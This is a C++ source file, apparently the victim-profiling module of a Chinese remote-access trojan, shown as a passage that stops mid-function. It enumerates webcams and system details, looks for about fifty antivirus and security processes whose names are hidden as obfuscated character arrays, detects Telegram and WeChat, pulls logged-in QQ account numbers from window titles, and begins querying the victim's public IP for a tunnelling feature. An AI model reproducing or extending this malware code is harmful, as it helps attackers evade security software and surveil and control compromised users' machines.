
//枚举视频设备
//////////////////////////////////////////////////////////
/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
#include <windows.h>    
#include "psapi.h"    
#include"stdio.h"  
#include <tlhelp32.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

extern char ConnetPass[20];
extern BOOL MyDele_zc;	 // 是否为绿色安装
extern BOOL MyFct;  //内网穿透
/**********************************/
UINT EnumDevices()
{
	HINSTANCE Ole32 = LoadLibrary("Ole32.dll"); 
	
    typedef void (WINAPI *TCoInitialize)(LPVOID ); 
    TCoInitialize MyCoInitialize = (TCoInitialize)GetProcAddress(Ole32, "CoInitialize");

    typedef void (WINAPI *TCoUninitialize)(void ); 
    TCoUninitialize MyCoUninitialize = (TCoUninitialize)GetProcAddress(Ole32, "CoUninitialize");

    typedef HRESULT (WINAPI *TCoCreateInstance)(IN REFCLSID , IN LPUNKNOWN ,IN DWORD , IN REFIID , OUT LPVOID FAR* ); 
	
    TCoCreateInstance MyCoCreateInstance = (TCoCreateInstance)GetProcAddress(Ole32, "CoCreateInstance");

	HINSTANCE Oleaut32 = LoadLibrary("Oleaut32.dll"); 

    typedef void (WINAPI *TSysFreeString)(BSTR ); 
    TSysFreeString MySysFreeString = (TSysFreeString)GetProcAddress(Oleaut32, "SysFreeString");

	MyCoInitialize(NULL);    //COM 库初始化
	UINT nCam = 0;
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器
	//创建设备枚举管理器
	HRESULT hr = MyCoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID
		NULL,                                                //表示Filter不被聚合
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象
		IID_ICreateDevEnum,                                  //获得的接口ID
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针
	if (hr != NOERROR)
	{
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口
	//获取视频类的枚举器
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //获取下一个设备
	{
		IPropertyBag *pBag;                                  //属性页接口指针
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //保存的是二进制数据
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息
            if (hr == NOERROR) 
            {
				nCam++;
				MySysFreeString(var.bstrVal);   //释放资源，特别要注意
            }
            pBag->Release();                  //释放属性页接口指针
        }
        pM->Release();                        //释放监控器接口指针
    }
	MyCoUninitialize();                   //卸载COM库

	if (Ole32)
		FreeLibrary(Ole32);

	if (Oleaut32)
		FreeLibrary(Oleaut32);
	
	return nCam;
}

void CPUClockMhzt(char *cTemp)
{
	char  dwCPUMhz[10]={0};
	ReadRegEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",  "~MHz", REG_DWORD, (char *)dwCPUMhz, NULL, sizeof(DWORD), 0);
	SYSTEM_INFO siSysInfo; 
	//复制硬件信息到SYSTEM_INFO结构变量
	m_gFunc.GetSystemInfo(&siSysInfo); 	

	m_gFunc.wsprintfA(cTemp, "%d*%sMHz", siSysInfo.dwNumberOfProcessors,dwCPUMhz);
	
	return;
}

extern char MyServiceName[70];
void GetHostRemark(LPTSTR lpBuffer, UINT uSize ,LPTSTR strSubKey)
{
	m_gFunc.memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_CURRENT_USER, strSubKey,"Remark", REG_SZ, lpBuffer, NULL,uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		m_gFunc.gethostname(lpBuffer, uSize);
}

void GetInstllTime(LPTSTR lpBuffer, UINT uSize , LPTSTR strSubKey)
{
	m_gFunc.memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_CURRENT_USER, strSubKey,"InstallTime", REG_SZ, lpBuffer, NULL,uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		lstrcpy(lpBuffer,"获取失败");
}

//////////////////////////系统版本begin
BOOL IsWindows64()
{
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)::GetProcAddress(GetModuleHandle("kernel32.dll"), "IsWow64Process");
	BOOL bIsWow64 = FALSE;
	if (fnIsWow64Process)
		if (!fnIsWow64Process(::m_gFunc.GetCurrentProcess(), &bIsWow64))
			bIsWow64 = FALSE;
		return bIsWow64;
}

BOOL GetNtVersionNumbers(DWORD&dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibrary("ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*,DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer,&dwBuildNumber);
			dwBuildNumber&= 0x0ffff;
			bRet = TRUE;
        }
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
    return bRet;
}
//////////////////////////系统版本end
char* GetVirus()
{		
	char RNykS[] = {'3','6','0','t','r','a','y','.','e','x','e','\0'}; //360安全卫士
	
	char lPIwz[] = {'a','v','p','.','e','x','e','\0'}; //卡巴斯基
	
	char faUnK[] = {'K','v','M','o','n','X','P','.','e','x','e','\0'}; //江民杀毒
	
	char RkWMC[] = {'R','a','v','M','o','n','D','.','e','x','e','\0'}; //瑞星杀毒
	
	char ygrrh[] = {'3','6','0','s','d','.','e','x','e','\0'}; //360杀毒
	
	char cuuPs[] = {'M','i','n','e','r','.','e','x','e','\0'}; //流量矿石
	
	char muFHe[] = {'e','g','u','i','.','e','x','e','\0'}; //NOD32
	
	char XitKI[] = {'k','x','e','t','r','a','y','.','e','x','e','\0'}; //金山毒霸
	
	char uayGU[] = {'T','M','B','M','S','R','V','.','e','x','e','\0'}; //趋势杀毒
	
	char RfVvj[] = {'a','v','g','u','i','.','e','x','e','\0'}; //AVG
	
	char AadTj[] = {'a','s','h','D','i','s','p','.','e','x','e','\0'}; //AVAST
	
	char NYiVD[] = {'M','P','M','O','N','.','E','X','E','\0'};//微点主动防御
	
	char UfYcW[] = {'a','v','c','e','n','t','e','r','.','e','x','e','\0'};//小红伞
	
	char cLMsc[] = {'s','p','i','d','e','r','n','t','.','e','x','e','\0'};//Dr.web
	
	char ezWYd[] = {'M','c','s','h','i','e','l','d','.','e','x','e','\0'};//Mcafee
	
	char vVsVA[] = {'f','-','s','e','c','u','r','e','.','e','x','e','\0'};//冰岛
	
	char ybBAI[] = {'a','r','c','a','v','i','r','.','e','x','e','\0'};//Arcavir
	
	char UVHhd[] = {'c','c','S','v','c','H','s','t','.','e','x','e','\0'};//诺顿杀毒
	
	char kZhtw[] = {'k','s','a','f','e','.','e','x','e','\0'};//金山卫士
	
	char ZzeaS[] = {'a','u','t','h','f','w','.','e','x','e','\0'};//Authentium
	
	char mALkC[] = {'v','s','s','e','r','v','.','e','x','e','\0'};//BitDefender
	
	char TfBKG[] = {'a','g','e','n','t','.','e','x','e','\0'};//韩国胶囊
	
	char iGtsy[] = {'c','f','p','.','e','x','e','\0'};//COMODO
	
	char xeAhK[] = {'F','-','P','R','O','T','.','e','x','e','\0'};//F-Port
	
	char uYhlH[] = {'g','u','a','r','d','x','s','e','r','v','i','c','e','.','e','x','e','\0'};//Ikarus
	
	char WeCIV[] = {'m','s','s','e','c','e','s','s','.','e','x','e','\0'};//MSE
	
	char fuJsh[] = {'V','3','S','v','c','.','e','x','e','\0'};//安博士V3
	
	char fwwgf[] = {'r','e','m','u','p','d','.','e','x','e','\0'};//熊猫卫士
	
	char sVgBo[] = {'a','l','m','o','n','.','e','x','e','\0'};//Sophos
	
	char gGNhq[] = {'A','P','A','S','S','e','r','v','.','e','x','e','\0'};//Sunbelt
	
	char bTJJi[] = {'F','o','r','t','i','T','r','a','y','.','e','x','e','\0'};//飞塔
	
	char SLboS[] = {'N','V','C','S','c','h','e','d','.','e','x','e','\0'};//Norman
	
	char zbDaI[] = {'Q','Q','P','C','R','T','P','.','e','x','e','\0'};//QQ电脑管家
	
	char igiXx[] = {'B','a','i','d','u','S','d','S','v','c','.','e','x','e','\0'};//百度杀毒
	
	char IosUG[] = {'q','q','.','E','X','E','\0'};//QQ
	
	char WaAUL[] = {'y','y','.','e','x','e','\0'};//YY
	
	char DnoFe[] = {'9','1','5','8','.','E','X','E','\0'};//9158
	
	char AmXYX[] = {'C','a','m','f','r','o','g',' ','V','i','d','e','o',' ','C','h','a','t','.','e','x','e','\0'};//CVC
	
	char CvbAi[] = {'m','s','t','s','c','.','E','X','E','\0'};//远程桌面
	
	char kzncF[] = {'A','l','i','I','M','.','e','x','e','\0'};//阿里旺旺
	
	char AkFoK[] = {'D','U','B','r','u','t','e','.','e','x','e','\0'};//DUB
	
	char eRmlH[] = {'N','s','v','m','o','n','.','n','p','c','\0'};//Naver
	
	char YSsNg[] = {'k','n','s','d','t','r','a','y','.','e','x','e','\0'};//可牛杀毒
	
	char YTKzh[] = {'s','.','e','x','e','\0'};//在捉鸡
	
	char nWrkK[] = {'F','T','P','.','e','x','e','\0'};//发现FTP
	
	char lmSkz[] = {'S','e','r','v','U','D','a','e','m','o','n','.','e','x','e','\0'};//发现S-U
	
	char SRKAz[] = {'1','4','3','3','.','e','x','e','\0'};//在扫1433
	
	char HpGdR[] = {'p','a','t','r','a','y','.','e','x','e','\0'};//安博士
	
	char kgTtp[] = {'c','c','S','e','t','M','g','r','.','e','x','e','\0'};//赛门铁克
	
	char uxttr[] = {'Q','U','H','L','P','S','V','C','.','E','X','E','\0'};//Quick Heal
	
	char CKnaH[] = {'s','a','f','e','d','o','g','.','e','x','e','\0'};//安全狗
	
	char* AllName = "";
	//360卫士						卡巴斯基			江民杀毒
	char* VirusName = RNykS;   char* VirusName1 = lPIwz; char* VirusName2 = faUnK;
	//瑞星									360杀毒					NOD32	
	char* VirusName3 = RkWMC;  char* VirusName4 = ygrrh; char* VirusName5 = cuuPs;
	//NOD32								金山毒霸						微点
	char* VirusName6 = muFHe;  char* VirusName7 = XitKI; char* VirusName8 = NYiVD;
	//趋势  								Avira						Avast
	char* VirusName9 = uayGU;  char* VirusName10 = UfYcW; char* VirusName11 = AadTj;
    //Dr.WEB                              麦咖啡                       F-secure
	char* VirusName12 = cLMsc; char* VirusName13 = ezWYd; char* VirusName14 = vVsVA;
	//金山卫士								Arcavir                    诺顿杀毒
	char* VirusName15 = kZhtw; char* VirusName16 = ybBAI; char* VirusName17 = UVHhd;
	//Authentium                           AVG                        BitDefender
	char* VirusName18 = ZzeaS; char* VirusName19 = RfVvj; char* VirusName20 = mALkC;
	//韩国胶囊                         Comodo                        F-PROT
	char* VirusName21 = TfBKG; char* VirusName22 = iGtsy; char* VirusName23 = xeAhK;
	//Ikarus                          微软杀毒						安博士V3 
	char* VirusName24 = uYhlH; char* VirusName25 = WeCIV; char* VirusName26 = fuJsh;
	//熊猫卫士                         Sophos                   Sunbelt  
	char* VirusName27 = fwwgf; char* VirusName28 = sVgBo; char* VirusName29 = gGNhq;
	//飞塔                                        Norman                  QQ安全管家 
	char* VirusName30 = bTJJi; char* VirusName31 = SLboS; char* VirusName32 = zbDaI;
	//百度杀毒							QQ							YY
    char* VirusName33 = igiXx; char* VirusName34 = IosUG; char* VirusName35 = WaAUL;
	//9158								CVC							远程桌面
	char* VirusName36 = DnoFe; char* VirusName37 = AmXYX; char* VirusName38 = CvbAi;
	//啊里旺旺							DUB                         Naver 杀毒
	char* VirusName39 = kzncF; char* VirusName40 = AkFoK; char* VirusName41 = eRmlH;
    //可牛杀毒                        在抓鸡						发现S-U
	char* VirusName42 = YSsNg; char* VirusName43 = YTKzh; char* VirusName44 = lmSkz;
	//在扫1433							FTP							安博士
	char* VirusName45 = SRKAz; char* VirusName46 = nWrkK; char* VirusName47 = HpGdR;
	//赛门铁克							Quick Heal					安全狗
	char* VirusName48 = kgTtp; char* VirusName49 = uxttr; char* VirusName50 = CKnaH;
     ZeroMemory( AllName, sizeof(AllName) );
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	if (GetProcessID(VirusName)) 
	{
//		OutputDebugString( "发现360安全卫士了" );
		ZeroMemory( VirusName, sizeof(VirusName) );
		VirusName = "360安全卫士";
		m_gFunc.lstrcatA( AllName, VirusName ); // 如果找到了进程, 就把名字加到AllName的后面
		m_gFunc.lstrcatA( AllName, " " ); // 用一个 隔开, 下面可能有别的杀软.
	}
	if (GetProcessID(VirusName1))
	{	
		ZeroMemory( VirusName1, sizeof(VirusName1) );
		VirusName1 = "卡巴斯基";
		m_gFunc.lstrcatA( AllName, VirusName1 ); 
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName2))
	{	
		ZeroMemory( VirusName2, sizeof(VirusName2) );
		VirusName2 = "江民";
		m_gFunc.lstrcatA( AllName, VirusName2 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName3))
	{	
		ZeroMemory( VirusName3, sizeof(VirusName3) );
		VirusName3 = "瑞星";
		m_gFunc.lstrcatA( AllName, VirusName3 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName4))
	{	
		ZeroMemory( VirusName4, sizeof(VirusName4) );
		VirusName4 = "360杀毒";
		m_gFunc.lstrcatA( AllName, VirusName4 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName5))
	{	
		ZeroMemory( VirusName5, sizeof(VirusName5) );
		VirusName5 = "流量矿石";
		m_gFunc.lstrcatA( AllName, VirusName5 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName6))
	{	
		ZeroMemory( VirusName6, sizeof(VirusName6) );
		VirusName6 = "NOD32";
		m_gFunc.lstrcatA( AllName, VirusName6 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName7))
	{	
		ZeroMemory( VirusName7, sizeof(VirusName7) );
		VirusName7 = "金山毒霸";
		m_gFunc.lstrcatA( AllName, VirusName7 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName8))
	{	
		ZeroMemory( VirusName8, sizeof(VirusName8) );
		VirusName8 = "微点";
		m_gFunc.lstrcatA( AllName, VirusName8 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName9))
	{	
		ZeroMemory( VirusName9, sizeof(VirusName9) );
		VirusName9 = "趋势";
		m_gFunc.lstrcatA( AllName, VirusName9 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName10))
	{	
		ZeroMemory( VirusName10, sizeof(VirusName10) );
		VirusName10 = "Avira";
		m_gFunc.lstrcatA( AllName, VirusName10 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName11))
	{	
		ZeroMemory( VirusName11, sizeof(VirusName11) );
		VirusName11 = "Avast";
		m_gFunc.lstrcatA( AllName, VirusName11 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName12))
	{	
		ZeroMemory( VirusName12, sizeof(VirusName12) );
		VirusName12 = "Dr.WEB";
		m_gFunc.lstrcatA( AllName, VirusName12 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName13))
	{	
		ZeroMemory( VirusName13, sizeof(VirusName13) );
		VirusName13 = "McAfee";
		m_gFunc.lstrcatA( AllName, VirusName13 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName14))
	{	
		char xHKLM[] = {'F','-','s','e','c','u','r','e','\0'};
		ZeroMemory( VirusName14, sizeof(VirusName14) );
		VirusName14 = xHKLM;
		m_gFunc.lstrcatA( AllName, VirusName14 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName15))
	{	
		ZeroMemory( VirusName15, sizeof(VirusName15) );
		VirusName15 = "金山卫士";
		m_gFunc.lstrcatA( AllName, VirusName15 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName16))
	{	
		ZeroMemory( VirusName16, sizeof(VirusName16) );
		VirusName16 = "Arcavir";
		m_gFunc.lstrcatA( AllName, VirusName16 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName17))
	{	
		ZeroMemory( VirusName17, sizeof(VirusName17) );
		VirusName17 = "诺顿";
		m_gFunc.lstrcatA( AllName, VirusName17 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName18))
	{	
		ZeroMemory( VirusName18, sizeof(VirusName18) );
		VirusName18 = "Authentium";
		m_gFunc.lstrcatA( AllName, VirusName18 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName19))
	{	
		ZeroMemory( VirusName19, sizeof(VirusName19) );
		VirusName19 = "AVG";
		m_gFunc.lstrcatA( AllName, VirusName19 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName20))
	{	
		ZeroMemory( VirusName20, sizeof(VirusName20) );
		VirusName20 = "BitDefender";
		m_gFunc.lstrcatA( AllName, VirusName20 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName21))
	{	
		ZeroMemory( VirusName21, sizeof(VirusName21) );
		VirusName21 = "韩国胶囊";
		m_gFunc.lstrcatA( AllName, VirusName21 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName22))
	{		
		char Ivneq[] = {'C','o','m','o','d','o','\0'};
		ZeroMemory( VirusName22, sizeof(VirusName22) );
		VirusName22 = Ivneq;
		m_gFunc.lstrcatA( AllName, VirusName22 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName23))
	{	
		char CzEcJ[] = {'F','-','P','R','O','T','\0'};
		ZeroMemory( VirusName23, sizeof(VirusName23) );
		VirusName23 = CzEcJ;
		m_gFunc.lstrcatA( AllName, VirusName23 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName24))
	{	
		char AuVDl[] = {'I','k','a','r','u','s','\0'};
		ZeroMemory( VirusName24, sizeof(VirusName24) );
		VirusName24 = AuVDl;
		m_gFunc.lstrcatA( AllName, VirusName24 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName25))
	{	
		ZeroMemory( VirusName25, sizeof(VirusName25) );
		VirusName25= "MSE";
		m_gFunc.lstrcatA( AllName, VirusName25 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName26))
	{	
		ZeroMemory( VirusName26, sizeof(VirusName26) );
		VirusName26= "安博士V3";
		m_gFunc.lstrcatA( AllName, VirusName26 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName27))
	{	
		ZeroMemory( VirusName27, sizeof(VirusName27) );
		VirusName27= "熊猫卫士";
		m_gFunc.lstrcatA( AllName, VirusName27 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName28))
	{	
		char kDCAx[] = {'S','o','p','h','o','s','\0'};
		ZeroMemory( VirusName28, sizeof(VirusName28) );
		VirusName28= kDCAx;
		m_gFunc.lstrcatA( AllName, VirusName28 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName29))
	{	
		ZeroMemory( VirusName29, sizeof(VirusName29) );
		VirusName29= "Sunbelt";
		m_gFunc.lstrcatA( AllName, VirusName29 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	
	if (GetProcessID(VirusName30))
	{	
		ZeroMemory( VirusName30, sizeof(VirusName30) );
		VirusName30= "飞塔";
		m_gFunc.lstrcatA( AllName, VirusName30 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName31))
	{	
		char XOAQy[] = {'N','o','r','m','a','n','\0'};
		ZeroMemory( VirusName31, sizeof(VirusName31) );
		VirusName31= XOAQy;
		m_gFunc.lstrcatA( AllName, VirusName31 );
		m_gFunc.lstrcatA( AllName, " " );
	}

	if (GetProcessID(VirusName32))
	{	
		ZeroMemory( VirusName32, sizeof(VirusName32) );
		VirusName32= "QQ管家";
		m_gFunc.lstrcatA( AllName, VirusName32 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName33))
	{	
		ZeroMemory( VirusName33, sizeof(VirusName33) );
		VirusName33 = "百度杀毒";
		m_gFunc.lstrcatA( AllName, VirusName33 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName34))
	{	
		ZeroMemory( VirusName34, sizeof(VirusName34) );
		VirusName34 = "QQ";
		m_gFunc.lstrcatA( AllName, VirusName34 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName35))
	{	
		ZeroMemory( VirusName35, sizeof(VirusName35) );
		VirusName35 = "YY";
		m_gFunc.lstrcatA( AllName, VirusName35 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName36))
	{	
		ZeroMemory( VirusName36, sizeof(VirusName36) );
		VirusName36 = "9158";
		m_gFunc.lstrcatA( AllName, VirusName36 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName37))
	{	
		ZeroMemory( VirusName37, sizeof(VirusName37) );
		VirusName37 = "CVC";
		m_gFunc.lstrcatA( AllName, VirusName37 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName38))
	{	
		ZeroMemory( VirusName38, sizeof(VirusName38) );
		VirusName38 = "远程桌面";
		m_gFunc.lstrcatA( AllName, VirusName38 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName39))
	{	
		ZeroMemory( VirusName39, sizeof(VirusName39) );
		VirusName39 = "阿里旺旺";
		m_gFunc.lstrcatA( AllName, VirusName39 );
		m_gFunc.lstrcatA( AllName, " " );
	}
	if (GetProcessID(VirusName40))
	{	
		ZeroMemory( VirusName40, sizeof(VirusName40) );
		VirusName40 = "DUB";
		m_gFunc.lstrcatA( AllName, VirusName40 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName41))
	{	
		ZeroMemory( VirusName41, sizeof(VirusName41) );
		VirusName41 = "Naver";
		m_gFunc.lstrcatA( AllName, VirusName41 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName42))
	{	
		ZeroMemory( VirusName42, sizeof(VirusName42) );
		VirusName42 = "可牛杀毒";
		m_gFunc.lstrcatA( AllName, VirusName42 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName43))
	{	
		ZeroMemory( VirusName43, sizeof(VirusName43) );
		VirusName43 = "在捉鸡";
		m_gFunc.lstrcatA( AllName, VirusName43 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName44))
	{	
		ZeroMemory( VirusName44, sizeof(VirusName44) );
		VirusName44 = "发现S-U";
		m_gFunc.lstrcatA( AllName, VirusName44 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName45))
	{	
		ZeroMemory( VirusName45, sizeof(VirusName45) );
		VirusName45 = "在扫1433";
		m_gFunc.lstrcatA( AllName, VirusName45 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName46))
	{	
		ZeroMemory( VirusName46, sizeof(VirusName46) );
		VirusName46 = "发现FTP";
		m_gFunc.lstrcatA( AllName, VirusName46 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName47))
	{	
		ZeroMemory( VirusName47, sizeof(VirusName47) );
		VirusName47 = "安博士";
		m_gFunc.lstrcatA( AllName, VirusName47 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName48))
	{	
		ZeroMemory( VirusName48, sizeof(VirusName48) );
		VirusName48 = "赛门铁克";
		m_gFunc.lstrcatA( AllName, VirusName48 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName49))
	{	
		ZeroMemory( VirusName49, sizeof(VirusName49) );
		VirusName49 = "Quick Heal";
		m_gFunc.lstrcatA( AllName, VirusName49 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (GetProcessID(VirusName50))
	{	
		ZeroMemory( VirusName50, sizeof(VirusName50) );
		VirusName50 = "安全狗";
		m_gFunc.lstrcatA( AllName, VirusName50 );
		m_gFunc.lstrcatA( AllName, " " );
	}
		if (m_gFunc.strstr(AllName, " " )  == 0 )
	{	
		m_gFunc.lstrcatA(AllName , "未发现 ");
	}

	return AllName;
}
////////////////////////////////////////////TG

typedef struct
{
	char *Course;
	char *Name;
} 
AYSDFEE;
AYSDFEE g_AntiVirus_Dataaa[91] = 
{
	{"Telegram.exe",    "TG"},
	{"  ",    "  "}
};

char* ssddd()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while (1)
	{
		if (strstr(g_AntiVirus_Dataaa[t].Course, " ") == 0)
		{
			if (GetProcessID(g_AntiVirus_Dataaa[t].Course))
			{
				lstrcat(AllName, g_AntiVirus_Dataaa[t].Name);
				lstrcat(AllName, " ");
			}
		}
		else
			break;
		t++;
	}
	
	if (strstr(AllName, " ") == 0)
	{
		lstrcat(AllName, "未登录TG");
	}
	
	return AllName;
}
////////////////////////////////////////////TG

////////////////////////////////////////////微信
typedef struct
{
	char *Course;
	char *Name;
}AYSDFFFE;

AYSDFFFE g_AntiVirus_Dataa[91] =
{
	{"WeChat.exe",    "微信"},
	{"WXWork.exe",      "企业微信"},
	{"  ",    "  "}
};

char* ssdddd()
{
	static char AllName[1024];
	int t = 0;
	memset(AllName, 0, sizeof(AllName));
	while (1)
	{
		if (strstr(g_AntiVirus_Dataa[t].Course, " ") == 0)
		{
			if (GetProcessID(g_AntiVirus_Dataa[t].Course))
			{
				lstrcat(AllName, g_AntiVirus_Dataa[t].Name);
				lstrcat(AllName, " ");
			}
		}
		else
			break;
		t++;
	}
	
	if (strstr(AllName, " ") == 0)
	{
		lstrcat(AllName, "未登录微信");
	}
	
	return AllName;
}
/////////////////
void clean_string(char *str)//去首尾空格
{
	char *start = str - 1;
	char *end = str;
	char *p = str;
	while(*p)
	{
		switch(*p)
		{
		case ' ':
		case '\r':
		case '\n':
			{
				if(start + 1==p)
					start = p;
			}
			break;
		default:
			break;
		}
		++p;
	}
	//现在来到了字符串的尾部 反向向前
	--p;
	++start;
	if(*start == 0)
	{
		//已经到字符串的末尾了 
		*str = 0 ;
		return;
	}
	end = p + 1;
	while(p > start)
	{
		switch(*p)
		{
		case ' ':
		case '\r':
		case '\n':
			{
				if(end - 1 == p)
					end = p;
			}
			break;
		default:
			break;
		}
		--p;
	}
	memmove(str,start,end-start);
	*(str + (int)end - (int)start) = 0;
}
char * GetQQ()
{
	char QQ[MAX_PATH] = {0};
	char szText[MAX_PATH] = "CTXOPConntion_Class";
    char szQQNumber[MAX_PATH] = {0};
    HWND hWnd = FindWindow(szText, NULL);
    while (hWnd)
    {
		if(m_gFunc.strcmp(szText,"CTXOPConntion_Class")==0)
		{
			GetWindowText(hWnd, szText, MAX_PATH);
			int len = m_gFunc.strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			strcat(QQ,szQQNumber);
			strcat(QQ," ");
		}
		hWnd=GetWindow(hWnd,GW_HWNDNEXT);
		GetClassName(hWnd,szText,MAX_PATH);
    }
	m_gFunc.CloseHandle(hWnd);
	clean_string(QQ);
	if (m_gFunc.strlen(QQ) > 4)
		return QQ;
	else
		return "NULL";
}
//////内网穿透
BOOL GetWanIPAddress(IN_ADDR *IPAddress)
{
	char szUrl[] = {'h','t','t','p',':','/','/','w','w','w','.','t','a','o','b','a','o','.','c','o','m','/','h','e','l','p','/','g','e','t','i','p','.','p','h','p','\0'};
	HINTERNET hInternet;
	HINTERNET hHttpFile;
	char *szHttpBuffer;
	DWORD dwHttpBufferLen;
	DWORD dwBytesRead;
	char *ip_start;
	char *ip_stop;
	hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL)
		return FALSE;
	hHttpFile = InternetOpenUrlA(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD, NULL);
	if (hHttpFile == NULL)
	{
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	if (!InternetQueryDataAvailable(hHttpFile, &dwHttpBufferLen, 0, 0))
	{
		InternetCloseHandle(hHttpFile);
		InternetCloseHandle(hInternet);
		return FALSE;
	}
	szHttpBuffer = new char[dwHttpBufferLen+1];
	m_gFunc.memset(szHttpBuffer, 0, dwHttpBufferLen+1);
	if (!InternetReadFile(hHttpFile, szHttpBuffer, dwHttpBufferLen, &dwBytesRead))
	{
